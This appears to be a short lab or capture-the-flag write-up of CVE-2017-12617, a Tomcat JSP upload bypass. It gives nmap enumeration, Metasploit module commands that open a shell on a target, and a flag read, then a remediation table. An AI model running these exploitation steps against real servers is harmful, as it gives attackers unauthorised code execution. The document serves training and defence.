# Apache Tomcat JSP Upload Bypass Remote Code Execution

## Summary

| Field | Detail |
|-------|--------|
| **CVE** | CVE-2017-12617 |
| **Affected Version** | Apache Tomcat 9.0.0.M1-9.0.0, 8.5.0-8.5.22, 8.0.0.RC1-8.0.46, 7.0.0-7.0.81 |
| **Attack Vector** | Network (HTTP PUT) |
| **Impact** | Remote Code Execution |

## Description

Apache Tomcat is vulnerable to remote code execution when HTTP PUT is enabled (i.e., the Default servlet's `readonly` initialization parameter is set to `false`). An attacker can upload a malicious JSP file via a specially crafted PUT request, bypassing the upload restrictions. The uploaded file is then executed by the server, resulting in arbitrary code execution.

## Enumeration

```bash
nmap -sV -sC TARGET_IP
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.4p1 Debian |
| 8080 | HTTP | Apache Tomcat 8.5.19 |

## Exploitation

**Module:** `exploit/multi/http/tomcat_jsp_upload_bypass`

```bash
msf6 > use exploit/multi/http/tomcat_jsp_upload_bypass
msf6 > set RHOSTS TARGET_IP
msf6 > set RPORT 8080
msf6 > run
```

The module uploads a JSP payload via HTTP PUT, bypassing the extension check, and returns a command shell session.

**Post-exploitation:**

```bash
cat /secret.txt
```

## Remediation

| Action | Priority |
|--------|----------|
| Update Tomcat to patched version | Critical |
| Set `readonly = true` on Default servlet | Critical |
| Disable HTTP PUT method if not required | High |
| Restrict access to management interfaces | High |

## References

- [CVE-2017-12617 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-12617)
- [Apache Tomcat Security Advisory](https://tomcat.apache.org/security-8.html)
